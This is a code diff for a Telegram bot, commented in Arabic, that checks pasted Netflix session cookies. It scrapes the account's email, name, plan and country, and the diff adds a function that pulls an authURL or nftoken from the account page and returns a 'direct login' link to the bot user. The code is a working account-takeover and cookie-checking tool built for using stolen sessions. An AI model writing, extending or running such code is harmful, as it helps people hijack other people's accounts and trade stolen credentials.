@@ -3,8 +3,8 @@ import aiohttp
 import re
 import os
 import logging
-import base64
-from urllib.parse import unquote
+import json
+from urllib.parse import unquote, urlencode
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
 from aiogram.dispatcher import FSMContext
@@ -63,6 +63,50 @@ def generate_nftoken(cookies_dict: dict) -> str:
 
     return ct_value
 
+async def get_auth_url(session: aiohttp.ClientSession, cookie_str: str, nftoken: str) -> str:
+    """توليد Auth Link حقيقي من نتفليكس"""
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json',
+        'Cookie': cookie_str,
+        'Referer': 'https://www.netflix.com/',
+        'Content-Type': 'application/json'
+    }
+
+    # محاولة من Shakti API
+    try:
+        # أخذ authUrl من صفحة الحساب
+        async with session.get('https://www.netflix.com/YourAccount', headers={
+            'User-Agent': headers['User-Agent'],
+            'Cookie': cookie_str
+        }) as resp:
+            if resp.status == 200:
+                text = await resp.text()
+
+                # البحث عن authURL كامل في الصفحة
+                auth_patterns = [
+                    r'authURL["\']?\s*:\s*["\']([^"\']+)["\']',
+                    r'authUrl["\']?\s*:\s*["\']([^"\']+)["\']',
+                    r'https?://[^"\']*nftoken=[^"\']+',
+                ]
+
+                for pattern in auth_patterns:
+                    match = re.search(pattern, text)
+                    if match:
+                        auth_url = match.group(1) if match.groups() else match.group(0)
+                        # لو الرابط فيه HTML entities نصلحه
+                        auth_url = auth_url.replace('&amp;', '&')
+                        if auth_url.startswith('http'):
+                            return auth_url
+    except:
+        pass
+
+    # لو مش لاقيين authUrl في الصفحة، نعمل الرابط يدوياً
+    if nftoken:
+        return f"https://netflix.com/?nftoken={urlencode({'token': nftoken})[7:]}"
+
+    return f"https://netflix.com/?nftoken={nftoken}"
+
 async def check_netflix_cookie(cookie_str: str) -> dict:
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -81,10 +125,11 @@ async def check_netflix_cookie(cookie_str: str) -> dict:
         'extra_membership': False,
         'member_since': None,
         'nftoken': None,
+        'auth_url': None,
         'error': None
     }
 
-    timeout = aiohttp.ClientTimeout(total=10)
+    timeout = aiohttp.ClientTimeout(total=12)
 
     try:
         async with aiohttp.ClientSession(timeout=timeout) as session:
@@ -117,16 +162,19 @@ async def check_netflix_cookie(cookie_str: str) -> dict:
                         result['member_since'] = since_match.group(1)
 
                     result['valid'] = True
+
+                    # استخراج nftoken
+                    cookies_dict = parse_cookies(cookie_str)
+                    result['nftoken'] = generate_nftoken(cookies_dict)
+
+                    # توليد auth_url
+                    result['auth_url'] = await get_auth_url(session, cookie_str, result['nftoken'])
                 else:
                     result['error'] = f"HTTP {resp.status}"
     except asyncio.TimeoutError:
         result['error'] = "انتهت مهلة الفحص"
     except Exception as e:
         result['error'] = str(e)
-
-    if result['valid']:
-        cookies_dict = parse_cookies(cookie_str)
-        result['nftoken'] = generate_nftoken(cookies_dict)
 
     return result
 
@@ -137,7 +185,7 @@ async def cmd_start(message: types.Message):
         "اضغط على **بدء الفحص** ثم أرسل الكوكيز.\n\n"
         "بعد الفحص تحصل على:\n"
         "✅ معلومات الحساب\n"
-        "🔑 روابط دخول جاهزة للنسخ",
+        "🔗 **Auth Links** جاهزة للدخول المباشر",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=main_menu()
     )
@@ -150,8 +198,8 @@ async def process_bot_info(callback_query: types.CallbackQuery):
         "هذا البوت يفحص كوكيز نتفليكس ويستخرج:\n"
         "- الإيميل والاسم\n"
         "- الخطة والدولة\n"
-        "- nftoken\n"
-        "- روابط تسجيل دخول جاهزة للنسخ",
+        "- **Auth Links** للدخول المباشر\n"
+        "- nftoken",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=main_menu()
     )
@@ -175,11 +223,7 @@ async def process_text_cookies(message: types.Message, state: FSMContext):
 
     if result['valid']:
         nftoken = result.get('nftoken', '')
-
-        # إنشاء الروابط مباشرة
-        phone_link = f"https://netflix.com/?nftoken={nftoken}"
-        pc_link = f"https://netflix.com/?nftoken={nftoken}"
-        tv_link = f"https://netflix.com/?nftoken={nftoken}"
+        auth_url = result.get('auth_url', '')
 
         result_text = f"""
 ✅ **فحص ناجح!**
@@ -197,18 +241,13 @@ async def process_text_cookies(message: types.Message, state: FSMContext):
 
 ━━━━━━━━━━━━━━━
 
-📱 **رابط الهاتف:**
-`{phone_link}`
+🔗 **Auth Link (دخول مباشر):**
 
-💻 **رابط الكمبيوتر:**
-`{pc_link}`
-
-📺 **رابط التلفاز:**
-`{tv_link}`
+`{auth_url}`
 
 ━━━━━━━━━━━━━━━
 
-⚠️ **اضغط مطولاً على أي رابط لنسخه**
+⚠️ **اضغط مطولاً على الرابط لنسخه ثم افتحه في المتصفح**
         """
         await message.reply(result_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())
     else:
